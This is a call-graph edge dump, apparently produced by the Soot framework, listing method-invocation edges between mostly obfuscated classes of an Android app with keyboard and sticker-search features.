STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Autocomplete", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r0.<jvu: void <init>(int)>(1) in <jvu: void <clinit>()> ==> <jvu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>(null, "", $r2) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r2) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lkl: void h(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("].") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r7 = staticinvoke <lvs: lvs a(java.lang.Object)>($r2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r4, $i0, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r11.<lvt: void <init>(lvr)>($r15) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: void <init>(lvr)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r2, $i2, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int hashCode()>
CLINIT edge: staticinvoke <hef: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hef: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(2) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("cause", class "Ljava/lang/Throwable;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Class: boolean isAssignableFrom(java.lang.Class)>($r4) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: boolean isAssignableFrom(java.lang.Class)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(10) in <lvr: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(2) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r3 = staticinvoke <java.lang.Long: java.lang.Long valueOf(long)>($l0) in <hbu: hbs f(java.lang.String,long)> ==> <java.lang.Long: java.lang.Long valueOf(long)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.c: void <init>(long)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r5.<hno: void <init>()>() in <hnt: void <clinit>()> ==> <hno: void <init>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(13) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r1.<lsh: void <init>(lto)>($r2) in <lsh: lsh j(java.lang.String)> ==> <lsh: void <init>(lto)>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int)>($i1) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <lje: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: int hashCode()>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Float: java.lang.Float valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <lkh: java.lang.Object[] toArray()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Set: java.util.Iterator iterator()>() in <ljf: java.util.Iterator iterator()> ==> <java.util.HashSet: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(java.util.List)> ==> <java.util.AbstractMap: void <init>()>
SPECIAL edge: specialinvoke r1.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Local", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(93) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i0 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r0) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean isEmpty()>() in <lqs: boolean equals(java.lang.Object)> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $r0 = virtualinvoke $r4.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Double: boolean isNaN(double)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gwk: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hno: void <init>()> ==> <iec: void <init>()>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lkq: lsb C(int)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: int hashCode()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int j()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsb: boolean hasNext()>() in <lsb: java.lang.Object next()> ==> <lsb: boolean hasNext()>
STATIC edge: $r4 = staticinvoke <java.lang.Integer: java.lang.String toHexString(int)>($i2) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Integer: java.lang.String toHexString(int)>
STATIC edge: $r3 = staticinvoke <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>("GMT") in <ose: void <clinit>()> ==> <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<lkm: void <init>(lkq,int)>(r0, $i0) in <lkq: lsb C(int)> ==> <lkm: void <init>(lkq,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkg: void c(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Class getClass()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lvr: int hashCode()>() in <lvt: int hashCode()> ==> <lvr: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmc: void <init>(lme)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lji: void <init>(java.util.Comparator)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsn: void <init>(java.util.logging.Level)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[0-9]+") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lsw d()>() in <lsn: lsw i(lsq)> ==> <lsf: lsw d()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
SPECIAL edge: specialinvoke $r0.<lqs: void <init>(lkq,java.util.Comparator)>($r2, $r1) in <lqs: void <clinit>()> ==> <lqs: void <init>(lkq,java.util.Comparator)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(17) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqs: int size()>
SPECIAL edge: specialinvoke $r4.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.w: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r6 = staticinvoke <ivw: java.lang.String l(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: java.lang.String l(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object[],int)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<lki: void <init>(java.lang.Object,java.lang.Object)>($r0, $r1) in <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)> ==> <lki: void <init>(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r14.<lvt: boolean a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: boolean a()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean containsAll(java.util.Collection)>($r4) in <lqs: boolean equals(java.lang.Object)> ==> <lqs: boolean containsAll(java.util.Collection)>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(11) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int rotateLeft(int,int)>($i0, 15) in <izw: int ac(int)> ==> <java.lang.Integer: int rotateLeft(int,int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String toString()>
STATIC edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void c()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: void c()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsu: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
SPECIAL edge: specialinvoke $r2.<lji: void <init>(java.util.Comparator)>($r0) in <lqd: lqd b(java.util.Comparator)> ==> <lji: void <init>(java.util.Comparator)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $l4 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long get()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long get()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmp: void <init>()> ==> <lma: void <init>()>
CLINIT edge: staticinvoke <lqs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqs: void <clinit>()>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStickerSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i1 = staticinvoke <java.lang.Math: int max(int,int)>($i1, 2) in <lma: int e(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: int hashCode()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: java.util.Iterator iterator()>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int size()>() in <liy: int size()> ==> <ljd: int size()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] x()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: boolean hasNext()>
SPECIAL edge: specialinvoke $r3.<lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>($r2, $r1, $i0, r0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractCollection: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<lvt: void <init>(lvr)>($r3) in <lvt: void <clinit>()> ==> <lvt: void <init>(lvr)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.Object w(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r6.<lly: void j(java.lang.Object)>($r8) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: void j(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $i1 = interfaceinvoke $r2.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lrg: boolean m()>
